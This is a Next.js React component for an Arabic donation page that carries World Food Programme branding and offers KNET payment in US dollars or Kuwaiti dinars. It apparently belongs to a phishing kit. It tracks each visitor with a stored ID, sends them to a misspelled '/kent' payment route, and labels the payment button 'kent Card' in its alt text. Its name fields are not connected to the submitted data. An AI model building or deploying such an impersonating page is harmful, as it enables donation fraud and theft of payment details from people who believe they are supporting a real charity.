'use client';
import Image from 'next/image';
import { Facebook, Twitter, Linkedin, Youtube, Instagram } from 'lucide-react';
import { v4 as uuidv4 } from 'uuid';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { useEffect, useState } from 'react';
import { createDonation } from './actions';
import { Card, CardContent } from '@/components/ui/card';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

export default function DonationForm() {
  const [loading, setLoading] = useState(false);
  const [cur, setCur] = useState('kd');
  const vidtorId = uuidv4();
  const router = useRouter();
  const [formData, setFormData] = useState({
    createdDate: new Date().toISOString(),
    type: 'monthly' as any,
    amount: 18,
    currency: 'USD',
    firstName: '',
    lastName: '',
    email: '',
    paymentMethod: 'card' as 'card' | 'paypal',
    vidtorId: vidtorId,
  });
const covertokd=(c:number)=>{
  let kd=c/3.1
  return kd
}
  const handleInitVistor = () => {
    localStorage.setItem('vistor', vidtorId);
    createDonation({
      createdDate: new Date().toISOString(),
      vidtorId: vidtorId,
    });
  };

  useEffect(() => {
    handleInitVistor();
  }, []);
  const handleAmountChange = (value: string) => {
    setFormData((prev) => ({ ...prev, amount: Number(value) }));
    localStorage.setItem('vv', value);

  };

  const handleCustomAmount = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value) {
      setFormData((prev) => ({ ...prev, amount: Number(value) }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const result = await createDonation(formData);
    router.push('/kent')
  };
  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="border-b">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <img
            src="/unwfpar.webp"
            alt="World Food Programme Logo"
            width={180}
            height={40}
            className="h-10 w-auto"
          />
          <Button variant="ghost" size="sm">
            العربية
          </Button>
        </div>
      </header>

      {/* Hero */}
      <div className="relative h-[300px] bg-slate-900">
        <img
          src="/picture2.jpg"
          alt="Food supplies background"
          width={1920}
          height={300}
          className="object-cover w-full h-full opacity-50"
        />
        <div className="absolute inset-0 flex items-center justify-center text-white">
          <div className="text-center space-y-4">
            <h1 className="text-4xl font-bold">تبرع الآن</h1>
            <p className="text-xl">
              يمكنك أن تصبح جزءاً مهماً للأطفال والعائلات
            </p>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <form className="flex-1 container mx-auto px-4 py-8" onSubmit={handleSubmit}>
        <Card className="max-w-4xl mx-auto bg-[#f0f3f6]">
          <CardContent>
            <Tabs defaultValue="monthly" dir="rtl" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-8">
                <TabsTrigger value="monthly">تبرع شهرياً</TabsTrigger>
                <TabsTrigger value="once">تبرع مرة واحدة</TabsTrigger>
              </TabsList>
              <TabsContent value="monthly" className="space-y-8">
                <div className="grid gap-6">
                  <div>
                    <h2 className="text-xl font-semibold mb-4 text-right">
                      تبرعك الشهري
                    </h2>
                    <p className="text-muted-foreground text-right mb-4">
                      أنت على وشك أن تصبح داعماً شهرياً لبرنامج الأغذية العالمي
                    </p>
                  </div>

                  <div className="grid gap-4">
                    <div className="text-right">
                      <label className="text-sm font-medium">العملة</label>
                      <select defaultValue={cur} onChange={(e)=>setCur(e.target.value)} className="mt-1 block w-32 rounded-md border-gray-300 shadow-sm focus:border-primary focus:ring-primary">
                        <option value={'USD'}>USD</option>
                        <option value={'kd'}>KD</option>

                      </select>
                    </div>

                 
               
                    <RadioGroup defaultValue="18" className="grid grid-cols-3 gap-4" onValueChange={handleAmountChange}>
                    <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="25" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==='USD'? 25.00:covertokd(25.00).toFixed(0)}</span>
                      </label>  <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="20" className="sr-only" />
                          
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==="USD"?20.00:covertokd(20.00).toFixed(0)}</span>
                      </label>  <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="15" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==="USD"?15.00:covertokd(15.00).toFixed(0)}</span>
                      </label>
                      <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="10" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==="USD"?10.00:covertokd(10.00).toFixed(0)}</span>
                      </label>
                      <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="5" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==="USD"?5.00:covertokd(5.00).toFixed(0)}</span>
                      </label>
                    </RadioGroup>



                    <div className="text-right">
                      <label className="text-sm font-medium">مبلغ آخر</label>
                      <div className="mt-1 relative">
                        <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">
                          {cur==='USD'?'$':'kd'}
                        </span>
                        <Input type="number" className="pl-8 text-left" />
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-right">
                      معلومات التواصل
                    </h3>
                    <div className="grid gap-4">
                      <div className="text-right">
                        <label className="block text-sm font-medium">
                          الاسم الأول *
                        </label>
                        <Input className="mt-1 text-right" required />
                      </div>
                      <div className="text-right">
                        <label className="block text-sm font-medium">
                          اسم العائلة *
                        </label>
                        <Input className="mt-1 text-right" required />
                      </div>
                   
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-right">
                      طريقة الدفع الخاصة بك
                    </h3>
                    <div className="grid grid-cols-2 gap-4">
                        <Button type="button" className="h-16">
                          <img
                            src="/knet.png"
                            alt="kent Card"
                            width={80}
                            height={40}
                          />
                        </Button>
                      <>
                        <Button
                          disabled
                          className="h-16 bg-gray-100 hover:bg-gray-100"
                        >
                          <img
                            src="/next.svg"
                            alt="kent Card"
                            width={80}
                            height={40}
                          />
                        </Button>
                      </>
                    </div>
                  </div>
                </div>
              </TabsContent>
              <TabsContent value="once">
                <div className="grid gap-6">
                  <div>
                    <h2 className="text-xl font-semibold mb-4 text-right">
                      تبرعك الشهري
                    </h2>
                    <p className="text-muted-foreground text-right mb-4">
                      أنت على وشك أن تصبح داعماً شهرياً لبرنامج الأغذية العالمي
                    </p>
                  </div>

                  <div className="grid gap-4">
                    <div className="text-right">
                      <label className="text-sm font-medium">العملة</label>
                      <select defaultValue={cur} onChange={(e)=>setCur(e.target.value)} className="mt-1 block w-32 rounded-md border-gray-300 shadow-sm focus:border-primary focus:ring-primary">
                        <option value={'USD'}> USD</option>
                        <option value={'kd'}> KD</option>
                      </select>
                    </div>
 
                    <RadioGroup defaultValue="18" className="grid grid-cols-3 gap-4" onValueChange={handleAmountChange}>
                    <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="27" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?'$':'kd'}{cur==='USD'? 25.00:covertokd(25.00).toFixed(0)}</span>
                      </label>  <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="27" className="sr-only" />
                          
                        <span className="text-xl font-bold">{cur==='USD'?' $':' kd'}{cur==="USD"?20.00:covertokd(20.00).toFixed(0)}</span>
                      </label>  <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="27" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?' $':' kd'}{cur==="USD"?15.00:covertokd(15.00).toFixed(0)}</span>
                      </label>
                      <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="18" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?' $':' kd'}{cur==="USD"?10.00:covertokd(10.00).toFixed(0)}</span>
                      </label>
                      <label className="flex flex-col items-center justify-between rounded-lg border-2 p-4 cursor-pointer [&:has(:checked)]:border-primary">
                        <RadioGroupItem value="10" className="sr-only" />
                        <span className="text-xl font-bold">{cur==='USD'?' $':' kd'}{cur==="USD"?5.00:covertokd(5.00).toFixed(0)}</span>
                      </label>
                    </RadioGroup>
                    <div className="text-right">
                      <label className="text-sm font-medium">مبلغ آخر</label>
                      <div className="mt-1 relative">
                        <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">
                          $
                        </span>
                        <Input type="number" className="pl-8 text-left" onChange={handleCustomAmount} />
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-right">
                      معلومات التواصل
                    </h3>
                    <div className="grid gap-4">
                      <div className="text-right">
                        <label className="block text-sm font-medium">
                          الاسم الأول *
                        </label>
                        <Input className="mt-1 text-right" required />
                      </div>
                      <div className="text-right">
                        <label className="block text-sm font-medium">
                          اسم العائلة *
                        </label>
                        <Input className="mt-1 text-right" required />
                      </div>
                     
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-right">
                      طريقة الدفع الخاصة بك
                    </h3>
                    <div className="grid grid-cols-2 gap-4">
                      <Button 
                      type='button'
                      className="h-16 border-primary">
                        <img
                          src="/knet.png"
                          alt="kent Card"
                          width={80}
                          height={40}
                        />
                      </Button>
                      <>
                        <Button
                          disabled
                          className="h-16 bg-gray-100 hover:bg-gray-100"
                          
                        >
                          <img
                            src="/next.svg"
                            alt="kent Card"
                            width={80}
                            height={40}
                          />
                        </Button>
                      </>
                    </div>
                  </div>
                </div>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
        <Button type="submit" className="w-full my-2" disabled={loading} >
          {loading ? "Processing..." : "انهاء عملية الدفع"}
        </Button>
      </form>

      {/* Footer */}
      <footer className="bg-[#1a4262] text-white py-8">
        {/*  */}
        <div className="container mx-auto px-4">
          <div className="flex flex-col items-center gap-4">
            <Image
              src="/logwop.png"
              alt="World Food Programme Logo"
              width={140}
              height={30}
              className="h-8 w-auto brightness-0 invert"
            />
            <div className="flex gap-4">
              <Button variant="ghost" size="icon">
                <Twitter className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon">
                <Facebook className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon">
                <Instagram className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon">
                <Linkedin className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon">
                <Youtube className="h-5 w-5" />
              </Button>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
